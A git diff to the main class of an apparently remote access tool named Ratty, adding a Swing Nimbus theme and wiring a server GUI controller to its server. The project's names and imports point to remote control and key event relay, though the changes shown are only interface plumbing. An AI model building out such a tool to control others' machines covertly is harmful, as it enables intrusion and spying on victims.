@@ -1,9 +1,16 @@
 package de.sogomn.rat;
 
+import java.awt.Color;
 import java.awt.event.KeyEvent;
+
+import javax.swing.UIDefaults;
+import javax.swing.UIManager;
+import javax.swing.plaf.nimbus.NimbusLookAndFeel;
 
 import de.sogomn.rat.packet.KeyEventPacket;
 import de.sogomn.rat.server.ActiveServer;
+import de.sogomn.rat.server.gui.RattyGui;
+import de.sogomn.rat.server.gui.ServerGuiController;
 
 
 public final class Ratty {
@@ -12,6 +19,20 @@ public final class Ratty {
 	
 	private Ratty() {
 		//...
+	}
+	
+	private static void setLookAndFeel() {
+		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
+		final UIDefaults defaults = nimbus.getDefaults();
+		
+		defaults.put("control", Color.LIGHT_GRAY);
+		defaults.put("nimbusBase", Color.LIGHT_GRAY);
+		
+		try {
+			UIManager.setLookAndFeel(nimbus);
+		} catch (final Exception ex) {
+			ex.printStackTrace();
+		}
 	}
 	
 	public static void connectToHost(final String address, final int port) {
@@ -32,11 +53,18 @@ public final class Ratty {
 	
 	public static void startServer(final int port) {
 		final ActiveServer server = new ActiveServer(port);
+		final RattyGui gui = new RattyGui();
+		final ServerGuiController controller = new ServerGuiController();
 		
+		gui.setController(controller);
+		
+		server.setObserver(controller);
 		server.start();
 	}
 	
 	public static void main(final String[] args) {
+		setLookAndFeel();
+		
 		if (CLIENT) {
 			System.out.println("Starting client");
 			
